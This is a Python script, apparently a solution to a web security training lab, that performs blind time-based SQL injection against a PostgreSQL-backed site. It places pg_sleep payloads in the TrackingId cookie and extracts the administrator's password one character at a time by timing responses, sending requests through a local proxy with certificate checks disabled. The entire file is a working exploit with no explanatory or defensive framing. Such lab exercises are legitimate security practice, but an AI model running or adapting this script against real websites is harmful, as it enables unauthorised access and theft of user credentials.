import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def SQLi_time(url):
    password_extrated=""
    for i in range(1,21):
        for j in range(32, 136):
            payload = "'||(SELECT CASE WHEN ascii(substring(password,%s,1)) = '%s' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')||'" %(i,j)
            payload_encode = urllib.parse.quote(payload)
            cookie = { 'TrackingId' : 'tQKxjy457I208hkr'+payload_encode, 'session' : 'kr2s3rpK28QCSg398buaJ879KmpDS0H0' }
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxy )
            if int(r.elapsed.total_seconds()) > 4:
                password_extrated += chr(j)
                sys.stdout.write('\r' + password_extrated)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extrated +chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) !=2:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print("[-] Example : %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    SQLi_time(url)

if __name__ == "__main__":
    main()